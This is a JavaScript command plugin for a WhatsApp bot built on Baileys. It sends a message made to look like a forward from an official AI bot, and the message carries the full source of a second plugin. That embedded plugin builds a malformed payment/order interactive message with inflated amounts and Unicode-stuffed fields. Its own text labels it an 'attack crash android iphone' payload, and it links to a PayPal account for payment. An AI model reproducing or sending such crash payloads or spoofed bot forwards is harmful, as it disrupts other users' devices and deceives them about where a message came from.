import * as crypto from 'crypto'
import pkg from '@whiskeysockets/baileys'
const { generateMessageID } = pkg

const snippetPagoCommand = {
    name: 'snippetpago',
    alias: ['pago-snippet-ai'],
    category: 'ai',
    run: async (m, { conn }) => {
        const codeMessage = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            {
                                messageType: 5,
                                codeMetadata: {
                                    codeLanguage: "python",
                                    codeBlocks: [
                                        { highlightType: 1, codeContent: "// plugin: pago-nativo.js\n" },
                                        { highlightType: 1, codeContent: "import" },
                                        { highlightType: 0, codeContent: " * as crypto from 'crypto'\n" },
                                        { highlightType: 1, codeContent: "import" },
                                        { highlightType: 0, codeContent: " pkg from '@whiskeysockets/baileys'\n" },
                                        { highlightType: 1, codeContent: "const" },
                                        { highlightType: 0, codeContent: " { prepareWAMessageMedia, generateMessageID } = pkg\n\n" },
                                        { highlightType: 1, codeContent: "const" },
                                        { highlightType: 0, codeContent: " pay = () => {\n" },
                                        { highlightType: 0, codeContent: "    return JSON.stringify({\n" },
                                        { highlightType: 1, codeContent: "currency" },
                                        { highlightType: 0, codeContent: ": 'USD', total_amount: { value: 12000000000, offset: 100 },\n" },
                                        { highlightType: 1, codeContent: "reference_id" },
                                        { highlightType: 0, codeContent: ": '𝖃𝖊𝖔𝖓 🦄ユニコード', type: 'https://paypal.me/CarlosFiden410/12',\n" },
                                        { highlightType: 1, codeContent: "order" },
                                        { highlightType: 0, codeContent: ": { status: 'payment_requested', subtotal: { value: 10000, offset: 100 }, tax: { value: 5600, offset: 100 }, discount: { value: 3000, offset: 100 }, shipping: { value: 20000, offset: 100 }, order_type: 'ORDER', items: [{ retailer_id: '00000000', product_id: '000000', name: '𝖃𝖊𝖔𝖓 🦄ユニコード', amount: { value: 10000, offset: 100 }, quantity: 100 }] },\n" },
                                        { highlightType: 1, codeContent: "native_payment_methods" },
                                        { highlightType: 0, codeContent: ": [], share_payment_status: false })\n" },
                                        { highlightType: 0, codeContent: "}\n\n" },
                                        { highlightType: 1, codeContent: "const" },
                                        { highlightType: 0, codeContent: " handler = async (m, { conn }) => {\n" },
                                        { highlightType: 0, codeContent: "    try {\n        // Prepara media\n        const media = await prepareWAMessageMedia({ image: { url: 'https://raw.githubusercontent.com/Trunkslaks/2take1fotos/aaade96f9cca75fcd7877fa034a35a5a118d20c2/Menu3.jpg' } }, { upload: conn.waUploadToServer });\n\n        const stanza = [{ attrs: { native_flow_name: 'order_details' }, tag: 'biz' }]\n\n        const gen = { interactiveMessage: { body: { text: '$3 attack crash android iphone' }, footer: { text: 'presiona ver pedido' }, header: { title: 'DG 𝕮𝖆𝖗𝖑𝖔𝖘', subtitle: 'https://paypal.me/CarlosFiden410/12', hasMediaAttachment: !!media?.imageMessage?.jpegThumbnail, jpegThumbnail: media?.imageMessage?.jpegThumbnail }, nativeFlowMessage: { buttons: [{ name: 'review_and_pay', buttonParamsJson: pay() }], messageVersion: 1 } }, messageContextInfo: { messageSecret: crypto.randomBytes(32) } };\n\n        await conn.relayMessage(m.chat, gen, { messageId: generateMessageID(), additionalNodes: stanza });\n    } catch (err) {\n        console.error('pago-nativo error:', err)\n    }\n}\n\nhandler.command = ['unico6']\nhandler.tags = ['2take1']\nexport default handler\n" }
                                    ]
                                }
                            }
                        ],
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }

        await conn.relayMessage(m.chat, codeMessage, {
            messageId: generateMessageID(conn.user?.id)
        })
    }
}

export default snippetPagoCommand
